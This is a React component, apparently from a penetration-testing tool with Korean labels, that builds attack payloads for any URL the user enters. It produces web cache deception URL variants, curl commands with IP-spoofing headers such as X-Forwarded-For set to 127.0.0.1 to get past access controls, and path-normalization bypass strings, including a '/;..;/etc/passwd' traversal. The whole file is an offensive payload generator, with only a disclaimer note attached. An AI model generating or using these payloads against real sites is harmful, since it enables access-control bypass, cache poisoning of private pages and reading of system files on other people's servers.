import { useState } from 'react'
import { DISCLAIMER, Note, TextInput, Readout } from './shared'

export function CdnProxyBypassBuilder() {
  const [url, setUrl] = useState('')
  const trimmed = url.trim()
  const target = trimmed || 'https://TARGET'

  const wcdVariants = [
    { label: 'CSS Static', ext: '.css' },
    { label: 'JS Static', ext: '.js' },
    { label: 'Image Static', ext: '.jpg' },
    { label: 'Text Static', ext: '.txt' },
  ]

  const spoofHeaders = [
    { header: 'X-Forwarded-For', val: '127.0.0.1' },
    { header: 'X-Real-IP', val: '127.0.0.1' },
    { header: 'X-Originating-IP', val: '127.0.0.1' },
    { header: 'X-Client-IP', val: '127.0.0.1' },
    { header: 'True-Client-IP', val: '127.0.0.1' },
  ]

  const normVariants = [
    { label: 'Semicolon Normalization', code: '/;..;/etc/passwd' },
    { label: 'Path Segment Bypass', code: '/%2e%2e%2f' },
    { label: 'Double Dot Encoding', code: '/..%2f' },
  ]

  return (
    <div className="payload-builder">
      <Note>{DISCLAIMER}</Note>
      <TextInput label="대상 URL" value={url} onChange={setUrl} placeholder="https://example.com" />

      <div className="payload-readout-group">
        <strong className="payload-group-title">Web Cache Deception (WCD) 변형</strong>
        {wcdVariants.map((v, i) => (
          <Readout key={i} title={v.label} value={`${target}${v.ext}`} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">IP 스푸핑 헤더 조합 (curl)</strong>
        {spoofHeaders.map((h, i) => (
          <Readout key={i} title={h.header} value={`curl -H "${h.header}: ${h.val}" ${target}`} wrap="anywhere" />
        ))}
      </div>

      <div className="payload-readout-group">
        <strong className="payload-group-title">경로 정규화 불일치 (ACL 우회)</strong>
        {normVariants.map((v, i) => (
          <Readout key={i} title={v.label} value={`${target}${v.code}`} wrap="anywhere" />
        ))}
      </div>
    </div>
  )
}

export default CdnProxyBypassBuilder
